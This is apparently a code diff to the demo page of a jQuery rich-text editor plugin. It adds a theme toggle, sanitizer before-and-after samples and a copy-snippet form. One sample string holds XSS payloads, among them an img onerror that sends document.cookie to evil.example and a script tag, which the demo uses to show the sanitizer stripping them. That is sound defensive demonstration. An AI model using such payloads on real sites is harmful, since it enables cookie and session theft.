@@ -97,14 +97,185 @@
       '<p>Esta é uma resposta de exemplo. No seu site, o assistente envia a instrução para o Gemini ou a OpenAI e insere o HTML gerado aqui, já sanitizado.</p>';
   }
 
+  var demo = null;
   if (window.jQuery && jQuery.fn.weaver) {
     jQuery('#weaver-demo').weaver({
-      height: 380,
+      height: 340,
       placeholder: 'Escreva algo...',
       onAiGenerate: function (prompt, done) {
         setTimeout(function () { done(aiDemoResponse(prompt)); }, 700);
       }
     });
+    demo = jQuery('#weaver-demo').data('weaver');
+  }
+
+  // Tema escuro do editor da demonstração (editor.setTheme)
+  var themeToggle = document.getElementById('theme-toggle');
+  if (themeToggle && demo && demo.setTheme) {
+    themeToggle.addEventListener('click', function () {
+      var dark = themeToggle.getAttribute('aria-pressed') !== 'true';
+      demo.setTheme(dark ? 'dark' : 'light');
+      themeToggle.setAttribute('aria-pressed', String(dark));
+      themeToggle.textContent = dark ? 'Voltar ao tema claro' : 'Ver no tema escuro';
+    });
+  } else if (themeToggle) {
+    themeToggle.hidden = true;
+  }
+
+  // ---------- O que o formulário recebe ----------
+
+  /** Quebra o HTML em linhas por bloco, para ler na folha. */
+  function formatHtml(html) {
+    var blocks = 'p|h[1-6]|ul|ol|li|blockquote|table|thead|tbody|tr|div|section|pre|figure|hr|style|script';
+    return String(html)
+      .replace(new RegExp('(</(' + blocks + ')>)', 'gi'), '$1\n')
+      .replace(new RegExp('(<(ul|ol|table|thead|tbody|tr|section)\\b[^>]*>)', 'gi'), '$1\n')
+      .replace(/\n\s*\n/g, '\n')
+      .replace(/^(<li\b|<tr\b|<td\b)/gim, '  $1')
+      .trim();
+  }
+
+  function bytes(text) {
+    var n = window.TextEncoder ? new TextEncoder().encode(text).length : text.length;
+    return n.toLocaleString('pt-BR') + ' bytes';
+  }
+
+  var WORD_SAMPLE = '<html xmlns:o="urn:schemas-microsoft-com:office:office"><body>' +
+    '<p class="MsoNormal" style="font-family:Calibri;font-size:11pt;mso-bidi-font-family:Arial"><b><span style="font-size:14pt;mso-fareast-font-family:Calibri">Caneca de cerâmica 350 ml</span></b></p>' +
+    '<p class="MsoNormal" style="font-family:Calibri;margin-bottom:8pt">Esmalte fosco, pode ir ao micro-ondas e à lava-louças.</p>' +
+    '<p class="MsoListParagraphCxSpFirst" style="mso-list:l0 level1 lfo1"><span style="mso-list:Ignore">·<span>&nbsp;&nbsp;</span></span>Capacidade: 350 ml</p>' +
+    '<p class="MsoListParagraphCxSpLast" style="mso-list:l0 level1 lfo1"><span style="mso-list:Ignore">·<span>&nbsp;&nbsp;</span></span>Cores: areia, musgo e grafite</p></body></html>';
+
+  var XSS_SAMPLE = '<p>Promoção de hoje!</p>\n' +
+    '<img src="x" onerror="fetch(\'//evil.example/?c=\'+document.cookie)">\n' +
+    '<a href="javascript:alert(1)" onclick="roubar()">Ver oferta</a>\n' +
+    '<script>alert("xss")</script>\n' +
+    '<p style="position:fixed;inset:0;background:url(//evil.example/x.png)">Clique</p>';
+
+  var TRUSTED_SAMPLE = '<!-- banner -->\n' +
+    '<section data-id="banner" style="display:grid;gap:8px;background-image:url(https://img.exemplo.com/a.jpg)">\n' +
+    '<style>.titulo{color:#0165ad}</style>\n' +
+    '<font face="Arial" class="titulo">Frete grátis</font>\n' +
+    '</section>';
+
+  var TRUSTED_OPTIONS = {
+    allowedTags: '*',
+    allowedAttributes: { '*': ['class', 'id', 'style', 'face', /^data-[\w-]+$/] },
+    allowedStyles: '*',
+    allowCssUrls: true,
+    keepComments: true,
+    forbiddenTags: ['script']
+  };
+
+  function sanitizeWith(options, html) {
+    var merged = window.WysiwygEditor.mergeOptions(window.WysiwygEditor.defaults, options || {});
+    return new window.HtmlSanitizer(merged).sanitize(html);
+  }
+
+  function wordOutput() {
+    var clean = window.SanitizerPlugin && SanitizerPlugin.cleanOfficeHtml ? SanitizerPlugin.cleanOfficeHtml(WORD_SAMPLE) : WORD_SAMPLE;
+    return demo.sanitize(clean);
+  }
+
+  var SAMPLES = {
+    live: function () {
+      return { field: 'conteudo_html', output: demo.getContent() };
+    },
+    word: function () {
+      return { field: 'conteudo_html', input: WORD_SAMPLE, inputLabel: 'Colado do Word', output: wordOutput() };
+    },
+    xss: function () {
+      return { field: 'conteudo_html', input: XSS_SAMPLE, inputLabel: 'Colado de um site qualquer', output: demo.sanitize(XSS_SAMPLE) };
+    },
+    trusted: function () {
+      return {
+        field: 'conteudo_html', input: TRUSTED_SAMPLE, inputLabel: 'HTML de um construtor de páginas',
+        output: sanitizeWith(TRUSTED_OPTIONS, TRUSTED_SAMPLE),
+        options: "allowedTags: '*', allowedStyles: '*', allowCssUrls: true, keepComments: true, data-* liberado"
+      };
+    }
+  };
+
+  var sheet = document.getElementById('sheet');
+  var sheetBody = document.getElementById('sheet-body');
+  var current = 'live';
+
+  function renderSheet(name) {
+    var s = SAMPLES[name]();
+    var html = '';
+    if (s.options) {
+      html += '<p class="sheet-options">Opções: <code>' + escapeHtml(s.options) + '</code></p>';
+    }
+    if (s.input) {
+      html += '<p class="sheet-label"><span>' + escapeHtml(s.inputLabel) + '</span><span>' + bytes(s.input) + '</span></p>' +
+        '<pre class="is-input"><code>' + escapeHtml(s.input) + '</code></pre>';
+    }
+    var output = formatHtml(s.output);
+    html += '<p class="sheet-label"><span>Enviado no formulário</span><span>' + bytes(s.output) + '</span></p>' +
+      '<pre><code data-lang="html">' + escapeHtml(output || '(vazio)') + '</code></pre>';
+    sheetBody.innerHTML = html;
+    var code = sheetBody.querySelector('code[data-lang]');
+    code.innerHTML = highlight(output || '(vazio)', 'html');
+  }
+
+  if (sheet && demo && window.HtmlSanitizer) {
+    var names = document.querySelectorAll('.output-name');
+    var select = function (name) {
+      current = name;
+      for (var n = 0; n < names.length; n++) names[n].setAttribute('aria-pressed', String(names[n].getAttribute('data-sample') === name));
+      sheet.classList.add('is-swapping');
+      setTimeout(function () { renderSheet(name); sheet.classList.remove('is-swapping'); }, 200);
+    };
+    for (var n = 0; n < names.length; n++) {
+      names[n].addEventListener('click', function () { select(this.getAttribute('data-sample')); });
+    }
+    renderSheet('live');
+    // O seu texto: acompanha o editor lá em cima
+    jQuery('#weaver-demo').on('change', function () { if (current === 'live') renderSheet('live'); });
+
+    // Instalação: o que chega no servidor (a mesma colagem do Word do vídeo)
+    var requestValue = document.getElementById('request-value');
+    if (requestValue) {
+      var sent = wordOutput();
+      requestValue.textContent = formatHtml(sent);
+      document.getElementById('request-size').textContent = bytes(sent);
+    }
+  }
+
+  // ---------- A frase com a lacuna ----------
+  var startForm = document.getElementById('start-form');
+  if (startForm) {
+    var startInput = document.getElementById('start-id');
+    var startCode = document.getElementById('start-code');
+    var startButton = startForm.querySelector('.start-button');
+    var snippet = function () {
+      var id = startInput.value.replace(/^#/, '').replace(/[^\w-]/g, '') || 'artigo';
+      return "$('#" + id + "').weaver();";
+    };
+    startInput.addEventListener('input', function () { startCode.textContent = snippet(); });
+    startForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      if (!navigator.clipboard) return;
+      navigator.clipboard.writeText(snippet()).then(function () {
+        startButton.textContent = 'copiado';
+        setTimeout(function () { startButton.textContent = 'copiar'; }, 1800);
+      });
+    });
+  }
+
+  // ---------- Entradas por rolagem (uma vez) ----------
+  var revealTargets = document.querySelectorAll('[data-reveal], .output-names, .output-stage, .start');
+  if ('IntersectionObserver' in window) {
+    var revealer = new IntersectionObserver(function (entries) {
+      entries.forEach(function (entry) {
+        if (!entry.isIntersecting) return;
+        entry.target.classList.add('is-in');
+        revealer.unobserve(entry.target);
+      });
+    }, { rootMargin: '0px 0px -12% 0px' });
+    for (var r = 0; r < revealTargets.length; r++) revealer.observe(revealTargets[r]);
+  } else {
+    for (var q = 0; q < revealTargets.length; q++) revealTargets[q].classList.add('is-in');
   }
 
   // ---------- Documentação a partir do README ----------
